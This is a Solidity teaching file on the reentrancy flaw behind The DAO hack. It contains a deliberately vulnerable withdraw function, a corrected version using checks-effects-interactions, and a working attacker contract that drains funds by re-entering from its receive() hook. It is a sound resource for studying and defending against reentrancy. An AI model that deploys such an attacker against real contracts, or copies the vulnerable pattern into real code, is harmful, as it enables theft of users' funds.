// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title The DAO - Simplified Reentrancy Vulnerability
 * @notice The original $60M hack that caused the Ethereum hard fork
 * 
 * ROOT CAUSE: ETH sent to caller BEFORE balance update
 * The attacker's fallback function would re-call withdraw() during the ETH transfer,
 * draining funds before the balance was set to 0.
 */

contract VulnerableDAO {
    mapping(address => uint256) public balances;
    
    // Deposit ETH
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    /**
     * @notice VULNERABLE withdrawal function
     * @dev Classic reentrancy: external call before state update
     */
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        // BUG: External call BEFORE state update
        // Attacker's receive() can re-enter this function
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // This line never executes during reentrancy attack
        // because attacker keeps re-entering before reaching here
        balances[msg.sender] = 0;
    }
    
    /**
     * @notice FIXED withdrawal function using CEI pattern
     */
    function withdrawFixed() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        // FIXED: Update state BEFORE external call
        balances[msg.sender] = 0;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @notice Attacker contract demonstrating the exploit
 */
contract DAOAttacker {
    VulnerableDAO public target;
    uint256 public attackCount;
    
    constructor(address _target) {
        target = VulnerableDAO(_target);
    }
    
    function attack() external payable {
        // Deposit some ETH first
        target.deposit{value: msg.value}();
        // Start the drain
        target.withdraw();
    }
    
    // This is called when target sends ETH
    receive() external payable {
        attackCount++;
        // Re-enter if target still has funds
        if (address(target).balance >= 1 ether && attackCount < 10) {
            target.withdraw();
        }
    }
    
    function getStolen() external view returns (uint256) {
        return address(this).balance;
    }
}
